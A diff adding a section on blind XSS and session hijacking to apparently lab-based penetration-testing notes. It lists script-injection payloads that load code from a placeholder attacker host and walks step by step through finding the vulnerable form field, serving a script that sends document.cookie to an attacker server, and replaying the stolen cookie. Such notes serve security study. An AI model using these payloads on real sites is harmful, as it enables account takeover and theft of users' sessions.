@@ -358,3 +358,125 @@ When the victim submits the fake login form, their credentials are sent directly
 ---
 
 ## XSS Attacks - Session Hijacking
+
+Web applications rely on cookies to maintain authenticated user sessions. If an attacker is able to steal a victim’s session cookie, they may gain authenticated access **without ever knowing the victim’s credentials**. When an XSS vulnerability is present, attackers can inject JavaScript that reads `document.cookie` and exfiltrates it to an attacker-controlled server, enabling session hijacking.
+
+Blind XSS occurs when a payload is executed in a part of the application not directly visible to the attacker, such as:
+
+- User registration forms
+- Comment moderation panels
+- Admin dashboards
+
+In these cases, the attacker does not immediately see the result of the payload execution. Instead, the application may respond with a generic message such as:
+
+```
+Thank you for registering. An Admin will review your request.
+```
+
+![Filtered output](images/session-hijacking.png)
+
+Because no visible output is returned, the attacker must rely on **out-of-band interaction** to confirm whether the payload executed successfully.
+
+To identify **blind XSS vulnerabilities**, the injected payload must trigger an outbound request to an attacker-controlled server. If such a request is received, it confirms that the payload executed in the victim’s browser.
+
+Registration and comment forms typically contain multiple input fields. To determine which specific field is vulnerable, the attacker can vary the requested resource path (for example, `/username`, `/profile`, etc.). When a request is received, the path reveals which field triggered the payload. At this stage, the remote script itself can be empty. 
+
+Common payloads used to load a remote script include:
+
+```javascript
+<script src=http://OUR_IP></script>
+```
+
+
+```javascript
+'><script src=http://OUR_IP></script>
+```
+
+
+```javascript
+"><script src=http://OUR_IP></script>
+```
+
+```javascript
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+```
+
+```javascript
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+```
+
+```javascript
+<script>$.getScript("http://OUR_IP")</script>
+```
+
+**Exploitation Walkthrough:**
+
+**Step 1: Start a Listening Server**
+
+Prepare a directory to host scripts and start a web server:
+
+```bash
+mkdir /tmp/tmpserver
+cd /tmp/tmpserver
+sudo php -S 0.0.0.0:8080
+```
+
+**Step 2: Identify the Vulnerable Field**
+
+Inject payloads into different form fields, adjusting the requested path to identify which field executes the payload:
+
+```
+"><script src=http://10.10.14.172:8001/fullname></script>
+
+"><script src=http://10.10.14.172:8001/username></script>
+
+"><script src=http://10.10.14.172:8001/profile></script>
+```
+
+![Filtered output](images/session-hijacking2.png)
+
+A request is received for the `/profile` path, indicating that the `profile` field is vulnerable to XSS.
+
+![Filtered output](images/session-hijacking3.png)
+
+**Step 3: Create the Cookie-Stealing Script**
+
+Create a JavaScript file (for example, `script.js`) that exfiltrates the victim’s cookies:
+
+```javascript
+document.location='http://OUR_IP:PORT/?c='+document.cookie;
+```
+
+or:
+
+```javascript
+new Image().src='http://OUR_IP:PORT/?c='+document.cookie;
+```
+
+**Step 4: Deliver the Final Payload**
+
+Inject a payload into the `profile` field that loads the malicious JavaScript file from the attacker-controlled server:
+
+```javascript
+"><script src=http://10.10.14.172:8080/script.js></script>
+```
+
+Once executed, the victim’s browser sends the session cookie to the attacker’s server.
+
+**Step 5: Hijack the Session**
+
+Navigate to the target application’s login page:
+
+```
+http://10.129.222.16/hijacking/login.php
+```
+
+Open the browser’s developer tools and locate the `cookie storage`. Insert the stolen cookie name and value manually.
+
+![Filtered output](images/session-hijacking4.png)
+
+After refreshing the page, the attacker gains authenticated access as the victim:
+
+![Filtered output](images/session-hijacking5.png)
+
+---
